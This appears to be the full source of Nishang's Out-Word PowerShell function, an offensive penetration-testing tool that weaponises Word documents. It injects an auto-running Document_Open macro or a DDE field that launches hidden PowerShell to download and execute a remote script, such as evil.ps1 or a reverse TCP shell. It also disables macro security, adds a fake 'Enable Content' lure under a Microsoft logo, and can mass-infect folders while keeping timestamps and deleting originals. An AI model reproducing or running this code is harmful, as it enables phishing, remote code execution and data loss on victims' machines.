function Out-Word
{
<#
.SYNOPSIS
Nishang Script which can generate as well as "infect" existing word files with an auto executable macro or DDE. 

.DESCRIPTION
The script can create as well as "infect" existing word files with an auto executable macro or DDE. Powershell or other payloads
could be exeucted using the genereated files. If path to a folder is passed to the script it can insert the payload in all existing word
files in the folder. With the Recurse switch, sub-folders can also be included. 
For existing files, a new macro or DDE enabled doc file is generated from a docx file and for existing .doc files, the payload is inserted.
LastWriteTime of the docx file is set to the newly generated doc file. If the RemoveDocx switch is enabled, the 
original docx is removed and the data in it is lost.

When a weapnoized Word file is generated, it contains a template to trick the target user in enabling content.

.PARAMETER Payload
Payload which you want to execute on the target.

.PARAMETER PayloadURL
URL of the powershell script which would be executed on the target.

.PARAMETER PayloadScript
Path to a PowerShell script on local machine. 
Note that if the script expects any parameter passed to it, you must pass the parameters in the script itself. 

.PARAMETER Arguments
Arguments to the powershell script to be executed on the target. To be used with PayloadURL parameter.

.PARAMETER DDE
Switch to use DDE attack vector in place of macros.

.PARAMETER WordFileDir
The directory which contains MS Word files which are to be "infected".

.PARAMETER OutputFile
The path for the output Word file. Default is Salary_Details.doc in the current directory.

.PARAMETER Recurse
Recursively look for Word files in the WordFileDir

.PARAMETER RemoveDocx
When using the WordFileDir to "infect" files in a directory, remove the original ones after creating the infected ones.

.PARAMETER RemainUnSafe
Use this switch to keep Macro Security turned off on your machine after using Out-Word.

.EXAMPLE
PS > Out-Word -Payload "powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-Process"

Use above command to provide your own payload to be executed from macro. A file named "Salary_Details.doc" would be generated
in the current directory.

.EXAMPLE
PS > Out-Word -PayloadScript C:\nishang\Shells\Invoke-PowerShellTcpOneLine.ps1 

Use above when you want to use a PowerShell script as the payload. Note that if the script expects any parameter passed to it, 
you must pass the parameters in the script itself. A file named "Salary_Details.doc" would be generated in the 
current directory with the script used as encoded payload.


.EXAMPLE
PS > Out-Word -PayloadURL http://yourwebserver.com/evil.ps1

Use above when you want to use the default payload, which is a powershell download and execute one-liner. A file 
named "Salary_Details.doc" would be generated  in the current directory.

.EXAMPLE
PS > Out-Word -PayloadURL http://yourwebserver.com/evil.ps1 -Arguments Evil

Use above when you want to use the default payload, which is a powershell download and execute one-liner.
The Arugment parameter allows to pass arguments to the downloaded script.

.EXAMPLE
PS > Out-Word -PayloadURL http://yourwebserver.com/Powerpreter.psm1 -Arguments "Invoke-PsUACMe;Get-WLAN-Keys"

Use above for multiple payloads. The idea is to use a script or module as payload which loads multiple functions. 


.EXAMPLE
PS > Out-Word -PayloadURL http://yourwebserver.com/evil.ps1 -OutputFile C:\docfiles\Generated.doc

In above, the output file would be saved to the given path.

.EXAMPLE
PS > Out-Word -PayloadURL http://yourwebserver.com/evil.ps1 -WordFileDir C:\docfiles\

In above, in the C:\docfiles directory, macro enabled .doc files would be created for all the .docx files, with the same name
and same Last MOdified Time.

.EXAMPLE
PS > Out-Word -PayloadURL http://yourwebserver.com/evil.ps1 -WordFileDir C:\docfiles\ -Recurse

The above command would search recursively for .docx files in C:\docfiles.

.EXAMPLE
PS > Out-Word -PayloadURL http://yourwebserver.com/evil.ps1 -WordFileDir C:\docfiles\ -Recurse -RemoveDocx

The above command would search recursively for .docx files in C:\docfiles, generate macro enabled .doc files and
delete the original files.

.EXAMPLE
PS > Out-Word -PayloadURL http://yourwebserver.com/Invoke-PowerShellTcpOneLine.ps1 -DDE

Use above for DDE attack instead of macro to download and execute PowerShell script in memory.

.EXAMPLE
PS > Out-Word -Payload "DDEAUTO C:\\windows\\system32\\cmd.exe ""/k calc.exe""" -DDE

Use above for custom payload with DDE.

.EXAMPLE
PS > Out-Word -PayloadScript C:\test\cradle.ps1 -DDE

Use above to encode and use a script with DDE attack. Since only 255 characters are supported with 
the DDE attack, this is mostly useful only for using encoded cradles.



.LINK
http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html
https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/
https://github.com/samratashok/nishang
#>



    [CmdletBinding()] Param(
        
        [Parameter(Position=0, Mandatory = $False)]
        [String]
        $Payload,
        
        [Parameter(Position=1, Mandatory = $False)]
        [String]
        $PayloadURL,

        [Parameter(Position=2, Mandatory = $False)]
        [String]
        $PayloadScript,

        [Parameter(Position=3, Mandatory = $False)]
        [String]
        $Arguments,

        [Parameter(Position=4, Mandatory = $False)]
        [Switch]
        $DDE,
        
        [Parameter(Position=5, Mandatory = $False)]
        [String]
        $WordFileDir,
        
        [Parameter(Position=6, Mandatory = $False)]
        [String]
        $OutputFile="$pwd\Salary_Details.doc",

        [Parameter(Position=7, Mandatory = $False)]
        [Switch]
        $Recurse,
        
        [Parameter(Position=8, Mandatory = $False)]
        [Switch]
        $RemoveDocx,

        [Parameter(Position=9, Mandatory = $False)]
        [Switch]
        $RemainUnSafe
    )
    
    $Word = New-Object -ComObject Word.Application
    $WordVersion = $Word.Version

    #Check for Office 2007 or Office 2003
    if (($WordVersion -eq "12.0") -or  ($WordVersion -eq "11.0"))
    {
        $Word.DisplayAlerts = $False
    }
    else
    {
        $Word.DisplayAlerts = "wdAlertsNone"
    }
    
    #Determine names for the Word versions. To be used for the template generated for tricking the targets.
    
    switch ($WordVersion)
    {
        "11.0" {$WordName = "2003"}
        "12.0" {$WordName = "2007"}
        "14.0" {$WordName = "2010"}
        "15.0" {$WordName = "2013"}
        "16.0" {$WordName = "2016"}
        default {$WordName = ""}
    }
    
        
    #Turn off Macro Security
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\word\Security" -Name AccessVBOM -Value 1 -PropertyType DWORD -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\word\Security" -Name VBAWarnings -Value 1 -PropertyType DWORD -Force | Out-Null

    if(!$Payload)
    {
        #Download-Execute payload for DDE
        #https://twitter.com/SecuritySift/status/918563308541829120
        $DDEPayload = "DDEAUTO ""C:\\Programs\\Microsoft\\Office\MSWord.exe\\..\\..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -W Hidden -NoP iex(New-Object Net.WebClient).DownloadString('$PayloadURL');$Arguments #"" ""data"""

        #Download-Execure payload for Macro
        $Payload = "powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
    }

    if($PayloadScript)
    {
        #Logic to read, compress and Base64 encode the payload script.
        $Enc = Get-Content $PayloadScript -Encoding Ascii
    
        #Compression logic from http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
        $ms = New-Object IO.MemoryStream
        $action = [IO.Compression.CompressionMode]::Compress
        $cs = New-Object IO.Compression.DeflateStream ($ms,$action)
        $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
        $Enc | ForEach-Object {$sw.WriteLine($_)}
        $sw.Close()
    
        # Base64 encode stream
        $Compressed = [Convert]::ToBase64String($ms.ToArray())
    
        $command = "Invoke-Expression `$(New-Object IO.StreamReader (" +

        "`$(New-Object IO.Compression.DeflateStream (" +

        "`$(New-Object IO.MemoryStream (,"+

        "`$([Convert]::FromBase64String('$Compressed')))), " +

        "[IO.Compression.CompressionMode]::Decompress)),"+

        " [Text.Encoding]::ASCII)).ReadToEnd();"

        #Generate Base64 encoded command to use with the powershell -encodedcommand paramter"
        $UnicodeEncoder = New-Object System.Text.UnicodeEncoding
        $EncScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($command))

        #Encoded script payload for DDE - length limit of 255 characters so mostly useful only for encoded cradles
        $DDEPayload = "DDEAUTO ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"" "" -e $EncScript"""
        if ($DDE)
        {
            if ($DDEPayload.Length -ge 255)
            {
                Write-Warning "DDE Attack cannot have payload longer than 255 characters. Exiting..."
                break
            }
        }
        #Encoded script payload for Macro
        $Payload = "powershell.exe -WindowStyle hidden -nologo -noprofile -e $EncScript"  
    }

    #Use line-continuation for longer payloads like encodedcommand or scripts.
    #Though many Internet forums disagree, hit and trial shows 800 is the longest line length. 
    #There cannot be more than 25 lines in line-continuation.
    $index = [math]::floor($Payload.Length/800)
    if ($index -gt 25)
    {
        Write-Warning "Payload too big for VBA! Try a smaller payload."
        break
    }
    $i = 0
    $FinalPayload = ""
    
    if ($Payload.Length -gt 800)
    {
        #Playing with the payload to fit in multiple lines in proper VBA syntax.
        while ($i -lt $index )
        {
            $TempPayload = '"' + $Payload.Substring($i*800,800) + '"' + " _" + "`n" 
            
            #First iteration doesn't need the & symbol.
            if ($i -eq 0)
            {
                $FinalPayload = $TempPayload
            }
            else
            {
                $FinalPayload = $FinalPayload + "& " + $TempPayload
            }            
            $i +=1

        }

        $remainingindex = $Payload.Length%800
        if ($remainingindex -ne 0)
        {
            $FinalPayload = $FinalPayload + "& " + '"' + $Payload.Substring($index*800, $remainingindex) + '"' 
        }

    #Macro code from here http://enigma0x3.wordpress.com/2014/01/11/using-a-powershell-payload-in-a-client-side-attack/
        $code_one = @"
        Sub Document_Open()
        Execute

        End Sub


             Public Function Execute() As Variant
                Const HIDDEN_WINDOW = 0
                strComputer = "."
                Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
         
                Set objStartup = objWMIService.Get("Win32_ProcessStartup")
                Set objConfig = objStartup.SpawnInstance_
                objConfig.ShowWindow = HIDDEN_WINDOW
                Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
                objProcess.Create "$FinalPayload", Null, objConfig, intProcessID
             End Function
"@
    }
    #If the payload is small in size, there is no need of multiline macro.
    else
    {
        # Escape double quotes. Useful for rundll32 payloads where double quotes are used. 
        $FinalPayload = $Payload -replace '"','""'
        $code_one = @"
        Sub Document_Open()
        Execute

        End Sub


             Public Function Execute() As Variant
                Const HIDDEN_WINDOW = 0
                strComputer = "."
                Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
         
                Set objStartup = objWMIService.Get("Win32_ProcessStartup")
                Set objConfig = objStartup.SpawnInstance_
                objConfig.ShowWindow = HIDDEN_WINDOW
                Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
                objProcess.Create "$FinalPayload", Null, objConfig, intProcessID
             End Function
"@
    }



    #If path to a directory containing Word files is given, infect the files in it.
    if ($WordFileDir)
    {
        $WordFiles = Get-ChildItem $WordFileDir\* -Include *.doc,*.docx
        if ($Recurse -eq $True)
        {
            $WordFiles = Get-ChildItem -Recurse $WordFileDir\* -Include *.doc,*.docx
        }
        ForEach ($WordFile in $WordFiles)
        {
            Write-Verbose "Reading files from $WordFileDir"
            $Word = New-Object -ComObject Word.Application
            if (($WordVersion -eq "12.0") -or  ($WordVersion -eq "11.0"))
            {
                $Word.DisplayAlerts = $False
            }
            else
            {
                $Word.DisplayAlerts = "wdAlertsNone"
            }
            $Doc = $Word.Documents.Open($WordFile.FullName)
            #Insert DDE Payload
            if ($DDE)
            {
                Write-Verbose "Using the DDE technique."
                if(!$DDEPayload)
                {
                    $word.Selection.InsertFormula($Payload)
                }
                else
                {
                    $word.Selection.InsertFormula($DDEPayload)
                }

            }
            #Else use macro
            else
            {
                Write-Verbose "Using auto-executable macro."
                $DocModule = $Doc.VBProject.VBComponents.Item(1)
                $DocModule.CodeModule.AddFromString($code_one)
            }
                        
            if ($WordFile.Extension -eq ".doc")
            {
                $Savepath = $WordFile.FullName
            }
            $Savepath = $WordFile.DirectoryName + "\" + $Wordfile.BaseName + ".doc"
            #Append .doc to the original file name if file extensions are hidden for known file types.
            if ((Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced).HideFileExt -eq "1")
            {
                $Savepath = $WordFile.FullName + ".doc"
            }
            if (($WordVersion -eq "12.0") -or  ($WordVersion -eq "11.0"))
            {
                $Doc.Saveas($SavePath, 0)
            }
            else
            {
                $Doc.Saveas([ref]$SavePath, 0)
            } 
            Write-Output "Saved to file $SavePath"
            $Doc.Close()
            $LastModifyTime = $WordFile.LastWriteTime
            $FinalDoc = Get-ChildItem $Savepath
            $FinalDoc.LastWriteTime = $LastModifyTime
            if ($RemoveDocx -eq $True)
            {
                Write-Output "Deleting $($WordFile.FullName)"
                Remove-Item -Path $WordFile.FullName
            }
            $Word.quit()
            [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Word) | Out-Null
        }
    }
    else
    {
        $Doc = $Word.documents.add()
        #Insert DDE Payload
        if ($DDE)
        {
            if(!$DDEPayload)
            {
                $DDEPayload = $Payload
                $word.Selection.InsertFormula($Payload)
            }
            else
            {
                $word.Selection.InsertFormula($DDEPayload)
            }
        }
        #Else use macro
        else
        {
            $DocModule = $Doc.VBProject.VBComponents.Item(1)
            $DocModule.CodeModule.AddFromString($code_one)
        }        
        #Add stuff to trick user in Enabling Content (running macros)
        $Selection = $Word.Selection 
        $Selection.TypeParagraph() 
        $Shape = $Doc.Shapes

        #Hardcoded path the jpg right now.
        $MSLogoPath = ".\microsoft-logo.jpg"
        if (Test-Path $MSLogoPath)
        {
            [void] $Shape.AddPicture((Resolve-Path $MSLogoPath))
        }
        $Selection.TypeParagraph() 
        $Selection.Font.Size = 42
        $Selection.TypeText("Microsoft Word $WordName")
        $Selection.TypeParagraph()
        $Selection.Font.Size = 16
        $Selection.TypeText("This document was edited in a different version of Microsoft Word.")
        $Selection.TypeParagraph()
        $Selection.TypeText("To load the document, please ")
        $Selection.Font.Bold = 1
        $Selection.TypeText("Enable Content")
            
    
        if (($WordVersion -eq "12.0") -or  ($WordVersion -eq "11.0"))
        {
            $Doc.Saveas($OutputFile, 0)
        }
        else
        {
            $Doc.Saveas([ref]$OutputFile, [ref]0)
        } 
        Write-Output "Saved to file $OutputFile"
        $Doc.Close()
        $Word.quit()
        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Word) | Out-Null
    }

    if ($RemainUnSafe)
    {
        Write-Warning "RemainUnsafe selected. Not turning on Macro Security"   
    }
    else
    {
        #Turn on Macro Security
        New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\word\Security" -Name AccessVBOM -Value 0 -Force | Out-Null
        New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\word\Security" -Name VBAWarnings -Value 0 -Force | Out-Null
    }
}


